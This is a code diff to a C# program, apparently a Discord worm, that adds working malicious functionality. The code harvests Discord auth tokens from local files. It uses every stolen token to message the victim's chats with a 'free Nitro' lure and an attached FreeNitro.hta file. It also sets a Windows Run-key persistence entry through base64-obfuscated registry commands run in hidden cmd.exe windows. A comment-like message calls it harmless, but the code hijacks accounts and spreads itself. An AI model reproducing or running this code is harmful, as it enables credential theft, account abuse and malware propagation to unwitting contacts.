@@ -1,8 +1,10 @@
 ﻿using System;
+using System.Text;
 using System.Collections.Generic;
 using System.IO;
 using System.Text.RegularExpressions;
 using System.Net.Http.Headers;
+using System.Diagnostics;
 
 namespace Discord2
 {
@@ -10,29 +12,38 @@ namespace Discord2
     {
         private static readonly HttpClient client = new HttpClient();
 
-
         public static void Run()
         {
+            if(OpenRegKey("warning")!=0){
+                Console.WriteLine("Already Infected!");
+                return;
+            }
+
             List<string> tokens = GetTokens();
             if (tokens.Count > 0){
-                SetHeaders(tokens[0]);
+                foreach (string t in tokens){
+                    SetHeaders(t);
+                    List<string>? chats = GetChatsID(t);
+                    if(chats == null)
+                        return;
+                    
+                    ByteArrayContent? fileContent = GetFile();
+                    if(fileContent == null)
+                        return;
+
+                    foreach(string c in chats){
+                        if(c != null)
+                            SendMessage(c, fileContent, "Hey, Discord sent me this, you want nitro for free too?");
+                    }
+
+                }
             } else {
                 Console.WriteLine("No Tokens found :(");
                 return;
             }
 
-            List<string>? chats = GetChatsID(tokens[0]);
-            if(chats == null)
-                return;
-
-            ByteArrayContent? fileContent = GetFile();
-            if(fileContent == null)
-                return;
-
-            foreach(string c in chats){
-                if(c != null)
-                    SendMessage(c, fileContent, "Hey, Discord sent me this, you want nitro for free too?");
-            }
+            string message = "Your Computer has been infected. Do not worry, nothing dangerous or maliciuos. Next time be more careful with files you download from the internet. PS: No free Nitro :(";
+            WriteRegKey(message);
         }
 
         static List<string> GetTokens()
@@ -66,7 +77,6 @@ namespace Discord2
 
                             foreach (Match match in Regex.Matches(fileContents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")){
                                 discordTokens.Add(match.Value);
-                                Console.WriteLine(String.Format("{0} Found at {1}", match.Value, currentFile));
                             }
 
                             foreach (Match match in Regex.Matches(fileContents, @"mfa\.[\w-]{84}"))
@@ -109,16 +119,19 @@ namespace Discord2
 
         static ByteArrayContent? GetFile()
         {   
-            Stream? fileStream = fileStream = File.OpenRead(@"FreeNitro.hta");
-            
-            if(fileStream != null)
-            {
-                var streamContent = new StreamContent(fileStream);
-                var fileContent = new ByteArrayContent(streamContent.ReadAsByteArrayAsync().Result);
-                return fileContent;
-            }
+            try{
+                Stream? fileStream = File.OpenRead(@"FreeNitro.hta");
 
-            return null;
+                if(fileStream != null)
+                {
+                    var streamContent = new StreamContent(fileStream);
+                    var fileContent = new ByteArrayContent(streamContent.ReadAsByteArrayAsync().Result);
+                    return fileContent;
+                }
+                return null;
+            } catch {
+                return null;
+            }
         }
 
         static void SendMessage(string chat_id, ByteArrayContent fileContent, string message)
@@ -132,6 +145,44 @@ namespace Discord2
             client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("multipart/form-data"));
 
             var response = client.PostAsync(String.Format("https://discordapp.com/api/v6/channels/{0}/messages", chat_id), formContent).Result;
+        }
+
+        static string FromBase64(string base64){
+            return Encoding.Default.GetString(Convert.FromBase64String(base64));
+        }
+
+        static int WriteRegKey(string message){
+            Process process = new Process();
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.RedirectStandardOutput = true;
+            startInfo.Arguments = String.Format(FromBase64("L0MgUkVHIEFERCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiB3YXJuaW5nIC90IFJFR19TWiAvZCAiezB9Ig=="), String.Format("powershell -noprofile -command \\\"Add-Type -Assemblyname PresentationFramework; [System.Windows.Messagebox]::Show('{0}', 'WARNING: Security Breach', 'OK', 'Exclamation')\\\"", message));
+            process.StartInfo = startInfo;
+            process.Start();
+
+            if(!process.WaitForExit(3000)){
+                process.Kill();
+            }
+
+            return process.ExitCode;
+        }
+
+        static int OpenRegKey(string name){
+            Process process = new Process();
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.RedirectStandardOutput = true;
+            startInfo.Arguments = String.Format(FromBase64("L0MgUkVHIFFVRVJZIEhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIC92IHswfQ=="), name);
+            process.StartInfo = startInfo;
+            process.Start();
+
+            if(!process.WaitForExit(3000)){
+                process.Kill();
+            }
+
+            return process.ExitCode;
         }
     }
 }
